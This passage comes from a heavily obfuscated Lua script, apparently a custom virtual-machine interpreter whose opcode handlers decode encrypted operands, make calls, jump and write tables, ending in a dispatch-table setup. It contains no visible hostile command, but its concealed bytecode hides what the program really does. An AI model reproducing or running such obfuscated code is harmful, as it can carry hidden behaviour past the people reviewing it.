w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0B10_0000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0b101001_011101100110)%256))%0b100000000)%0x10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0B10000_0000))%0b100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0b10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0b1010010_11101100110)%0x100))%0b10000000_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%256))*256;_e=_e+2;bwo[w6]=JkZ(m+1) end local function BCH() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0X100))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0x100))%0X1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0B101001011101100110)%256))%256)%0B10000_0000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110_110101000000+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b100000110_0110111+0x2_9766)%0b10000_0000))%0B10000_0000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B10100110000101110111)%0x100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x833_7+0B101001011101100110)%256))%0B100000000)%0B100000_000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0x29766)%0X100))%0X100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B11011101101010_00000+0xa6177)%0B100_000000))*256;_e=_e+2;bwo[w6]=bwo[m]+bwo[JNt] end local function eTW() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0x29766)%0b100000000))%0B1000000_00)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B100000110011011_1+0X29766)%0b100000_000))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0b100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1_000001100110111+0x29766)%0B100_000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+680311)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0b101001011101100110)%0B100000000))%0X100)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6177)%0x100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X833_7+0X297_66)%0b100000000))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110_110101000000+0Xa617_7)%0x1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29_766)%0B100000000))%0B10000000_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed_40+0xa_6177)%256))*256;_e=_e+2;bwo[w6]=(m~=0);if JNt~=0 then _e=_e+1+6 end end local function m4() bwo[CXt+1]=bwo[CXt] end local function Q8o() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x297_66)%0x100))%0b100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed4_0+0xa61_77)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%0b100000_000))%0B10000000_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b100000110011011_1+0b101001011101100110)%0x10_0))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0Xa6177)%0x1_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0x29766)%0X100))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%0b100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x83_37+0X29766)%256))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+169830)%0x100))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6_ed40+0xa6177)%0b100000000))*256;_e=_e+2;local _N=bwo[w6];local _x1;if m==0 then _x1=CXt-w6-1 else _x1=m-1 end;local _Q1={};for _mv=1,_x1 do _Q1[_mv]=bwo[w6+_mv] end;local _W22={_N(ARt(_Q1,1,_x1))};local _xY=#_W22;if JNt==0 then for _mv=1,_xY do bwo[w6+_mv-1]=_W22[_mv] end;CXt=w6+_xY else local _zK=JNt-1;for _mv=1,_zK do bwo[w6+_mv-1]=_W22[_mv] end end end local function Tvc() local _junk=bwo[44];bwo[23]=_junk end local function r0() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+169830)%256))%0x100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6_177)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0B1010_01011101100110)%256))%256)%0b1000_00000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0b10_100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0X29766)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0b1000_00000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0x100))%0b10_0000000)%0b100_000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%256))*256-32768;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B10000011001_10111+0b101001011101100110)%0X100))%256)%0x10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0B10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%0B100000000))%0B1000_00000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed4_0+680311)%256))*256;_e=_e+2;local _N=bwo[w6];local _C0=bwo[w6+1];local _R=bwo[w6+2];local _W22={_N(_C0,_R)};if _W22[1]~=nil then bwo[w6+2]=_W22[1];for _mv=1,JNt do bwo[w6+2+_mv]=_W22[_mv] end;_e=_e+m end end local function at() bwo[CXt+1]=bwo[CXt] end local function D() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%256))%0X100)%0b1_00000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0Xa617_7)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X29_766)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+0B101_001011101100110)%256))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed_40+0B10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001_100110111+0X29766)%0B100000000))%256)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b11011101101010_00000+680311)%0B100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0X1_00))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%0B10000000_0))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110_101000000+680311)%0x10_0))*256;_e=_e+2;if (bwo[m]<bwo[JNt])~=(w6~=0) then _e=_e+1+2 end end local function Nx() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1_000001100110111+0b1010010111_01100110)%256))%256)%0X100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6_ed40+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%256))%0B100000000)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000101110111)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0X100))%256)%0B1000000_00),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0X29766)%0B100000000))%0X100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0xa6177)%0x10_0))*256-32768;_e=_e+2;bwo[w6]=bwo[w6]+bwo[w6+2];local _WN=bwo[w6+2];local _mv=bwo[w6];local _IKj=bwo[w6+1];if (_WN>=0 and _mv<=_IKj) or (_WN<0 and _mv>=_IKj) then bwo[w6+3]=_mv;_e=_e+m end end local function gvn() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%0B100000000))%0x100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0X29766)%0x100))%0X10_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0B10100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0b10100101110_1100110)%256))%0x100)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0b10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0X29766)%0B100000000))%0b1000_00000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0B101001_10000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0X297_66)%0X100))%0B100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0Xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0X29766)%0X100))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B10100110000101110111)%256))*256;_e=_e+2;if (bwo[m]==bwo[JNt])~=(w6~=0) then _e=_e+1+2 end end local function l() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X833_7+169830)%0B1000_00000))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0b101001011101100110)%256))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B11_01110110101000000+680311)%0b100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x2_9766)%0x1_00))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0b101001011101100110)%0B100000000))%0X10_0)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0B10100110000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%256))%0b100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0X29766)%0b100000000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+680311)%0x10_0))*256;_e=_e+2;if (bwo[m]==bwo[JNt])~=(w6~=0) then _e=_e+1+2 end end local function ex0() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%256)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0X29766)%0b100000000))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0Xa6_177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b100000000))%0B100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*0b11011101101010000_00+0Xa6177)%0B1000000_00))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8_337+0X29766)%256))%256)%0b1000000_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0X100))*256;_e=_e+2;for _mv=w6,w6+m do bwo[_mv]=nil end end local function NR6() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8_337+0B101001011_101100110)%0B1_00000000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa61_77)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+169830)%0b100000000))%256)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0b1101110110101000000+0b10100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0x29766)%0X100))%0B100000000)%0B1_00000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B110_1110110101000000+680311)%0b100000_000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0X100))%256)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b10100110000101110111)%0b100000000))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+169830)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0B1101110110101000000+0xa6177)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000_001100110111+0B10100101110_1100110)%0B100000000))%0B100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed_40+0b101001100001_01110111)%0x100))*256;_e=_e+2;bwo[w6+1]=bwo[m];bwo[w6]=bwo[m][JkZ(JNt+1)] end local function Gqn() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x2976_6)%0B10000_0000))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0X29766)%256))%0B100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6_ed40+680311)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b10_0000000))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0X10_0))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0B101001011101100110)%0X100))%0x100)%0X100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+680311)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0x29766)%0x10_0))%0B100000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110_110101000000+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0X29766)%0X100))%0B100000000)%0x10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0xa61_77)%0b100000000))*256;_e=_e+2;local _N=bwo[w6];local _x1;if m==0 then _x1=CXt-w6-1 else _x1=m-1 end;local _Q1={};for _mv=1,_x1 do _Q1[_mv]=bwo[w6+_mv] end;local _W22={_N(ARt(_Q1,1,_x1))};local _xY=#_W22;if JNt==0 then for _mv=1,_xY do bwo[w6+_mv-1]=_W22[_mv] end;CXt=w6+_xY else local _zK=JNt-1;for _mv=1,_zK do bwo[w6+_mv-1]=_W22[_mv] end end end local function rM6() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100110)%256))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed40+0b10100110000101_110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0x29766)%256))%0B100000000)%0X10_0),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0xa6_177)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0b101001011101100110)%0b100000000))%0x10_0)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0b10100110000101110111)%0b100000000))*256;_e=_e+2;bwo[w6]=fjv[m+1][1] end local function rTX() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%256))%256)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*0B11011101_10101000000+0B10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0X100))%0b10_0000000)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0b1010011000010111_0111)%256))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+169830)%0x1_00))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0b1101110110101000000+0b10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0B1010010_11101100110)%256))%0X100)%0b100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0B10100110000101110111)%256))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0b1000001100110111+0x29766)%0B100000000))%0B100000000)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101001011101100110)%256))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0xa6177)%256))*256;_e=_e+2;local _R=bwo[m];local _HG0=(_R~=nil and _R~=false);if _HG0==(JNt~=0) then bwo[w6]=_R else _e=_e+1+2 end end local function fV4() bwo[4]=(bwo[45] or 0)+4 end local function Sk1() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%256))%0b100000000)%0B100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0Xa6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+0X29766)%0b1000000_00))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+680311)%0x1_00))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0B100000000))%0B1_00000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x8337+0b101001011101100110)%0X10_0))%256)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+680311)%0b100000000))*256;_e=_e+2;bwo[w6]=bwo[m][1] end local function FMx() bwo[31]=nil end local function Ep() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+169830)%0b100000000))%256)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0B11011101101_01000000+0b10100110000101110111)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0x100))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed_40+0B10100110000101110111)%0b100000000))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x833_7+0b10100101_1101100110)%0B1_00000000))%0b1_00000000)%0x100),tc(Gi[(_e-1)%tR+1],((_e-1)*0X6ed40+680311)%0b100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+169830)%256))%0B100000000)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0x10_0))*256;_e=_e+2;bwo[w6]=not bwo[m] end local function H5() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%256))%0x100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%0x100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+0B101_001011101100110)%0X100))%0x100)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0X100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x2_9766)%0x10_0))%256)%0X10_0),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0b1000001100110111+0x29766)%256))%0x100)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6_ed40+0B10100110000101110111)%0X100))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0b101001011101100_110)%0b100000000))%0x100)%0b100000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%256))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8_337+169830)%0x10_0))%0X10_0)%0X1_00),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+0B10100110000_101110111)%0b1000000_00))*256;_e=_e+2;bwo[w6][bwo[m]]=bwo[JNt] end local function n80() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0X8337+169830)%0X1_00))%0x100)%0B1_00000000),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0B1000001100110111+0B1010010111_01100110)%0b10000_0000))%0b100000000)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0B1101110110101000000+0Xa_6177)%0X10_0))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0B1000001100110111+169830)%256))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0b10100110000101110111)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%256))%0X1_00)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*453952+680311)%0X10_0))*256;_e=_e+2;bwo[w6]={bwo[m]} end local function CN() local w6=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0x29_766)%0B100000000))%0X100)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*0x6ed_40+0Xa_6177)%0X100))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*33591+169830)%0b100000000))%256)%256),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed40+0b10100110000101110111)%0x100))*256;_e=_e+2;local m=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*33591+0B101001011101100110)%0x100))%0B100000000)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+0xa6177)%0B100000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0x833_7+0B1010010_11101100110)%0X100))%0B100000000)%0x100),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0X6ed4_0+0Xa6177)%0X1_00))*256;_e=_e+2;local JNt=tc(((em[(Y7R[_e])+1]-((Wi[(_e-1)%KA+1]+((_e-1)*0x8337+0b101001011101100110)%0X100))%256)%256),tc(Gi[(_e-1)%tR+1],((_e-1)*453952+680311)%0B10_0000000))+tc(((em[(Y7R[_e+1])+1]-((Wi[(_e+1-1)%KA+1]+((_e+1-1)*0X8337+169830)%0b100000000))%0b100000000)%0B100000000),tc(Gi[(_e+1-1)%tR+1],((_e+1-1)*0x6ed40+0b10100110000101110111)%256))*256;_e=_e+2;bwo[w6]=oN(bwo[m]%4294967296,bwo[JNt]%4294967296) end s9o[(tc(50,0x7b)+0b1011011011-731)]=d s9o[((202+0X189_6)-6294)]=RWD s9o[((0Xdc+0x184_2)-0X1842)]=zD s9o[tc(0x12,145)]=mQ7 s9o[tc(197,tc(0b11_000101,tc(113,131)))]=w0z s9o[tc(0b1111111_0,188)]=b s9o[tc(168,0b110111_00)]=z s9o[tc(0b1010001,0B1111_0011)]=OJ s9o[(tc(40,0Xf7)+0b1100100001-0x321)]=K80 s9o[tc(0xf7,0xb0)]=ox s9o[tc(119,243)]=Q6 s9o[(tc(0B110100,0x28)+877-0x36_d)]=HN s9o[(tc(0X33,0B1_00111)+0b1111_11000-0X1_f8)]=D5i s9o[tc(0xc6,tc(0Xc6,tc(0b11011111,0X88)))]=I s9o[(tc(0B11110010,0xd2)+330-0X14a)]=PJ s9o[tc(90,tc(90,tc(186,0B11000100)))]=ekH s9o[(tc(0b1100001,0b10001000)+0x1af-0B110101111)]=Ms9 s9o[(tc(0X54,0b1101001_1)+318-0X13e)]=gR s9o[tc(0Xb4,0X98)]=dC s9o[(tc(204,49)+182-0b10110110)]=OW s9o[((0B11_11000+0x59c)-0X5_9c)]=Ha s9o[tc(0b10100110,tc(0Xa6,tc(0x95,182)))]=uao s9o[(tc(142,0B1110110)+0B1110111-119)]=sG s9o[((0xe8+2618)-0xa_3a)]=yw9 